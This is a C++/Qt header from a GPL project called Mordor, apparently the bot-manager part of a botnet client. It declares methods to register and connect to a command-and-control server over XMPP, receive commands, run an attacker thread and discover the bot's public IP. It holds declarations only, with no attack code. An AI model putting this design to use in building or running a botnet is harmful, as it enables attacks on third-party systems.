/**
 *  This file is part of Mordor.
 *
 *  Copyright (c) 2016 Juan Jose Salazar Garcia jjslzgc@gmail.com
 *
 *  Mordor is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Mordor is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Mordor.  If not, see <http://www.gnu.org/licenses/>.
 *
 **/

#ifndef BOTMANAGER_H
#define BOTMANAGER_H

#include <QObject>
#include <QString>

#define IP_ADDRESS_API "http://api.ipify.org"
#define MINUTES_OF_WAITING 10

class XmppClient;
class XmppRegClient;
class Bot;
class Message;
class QThread;
class Attacker;
class QNetworkAccessManager;
class QNetworkReply;

class BotManager : public QObject
{
    Q_OBJECT
public:
    static BotManager *instance();
signals:
    void ready();
    void unregistered();
    void serverListNotFound();
public slots:
    void connectToCC();
    void disconnectFromCC();
    void registerOnCC();
private slots:
    void readyOnXmppClient();
    void commandReceivedOnBot(Message *command);
    void attackDone();
    void finishedOnNetworkAccessManager(QNetworkReply *reply);
    void successOnXmppRegClient(const QString& server, const QString& username, const QString& password);
    void failureOnXmppRegClient(const QString& server, const QString& username, const QString& password);
private:
    BotManager();
    ~BotManager();
    void createConnections();
    void setupConfig();
    void setupBot(const QString& pubIp);
    void sendHttpGetRequestToDiscoverIp();
    void writeEvent(const QString& event);

    XmppClient *_xmppClient;
    XmppRegClient *_xmppRegClient;
    Bot *_bot;
    QThread *_attackerThread;
    Attacker *_attacker;
    QNetworkAccessManager *_networkAccessManager;
};

#endif // BOTMANAGER_H
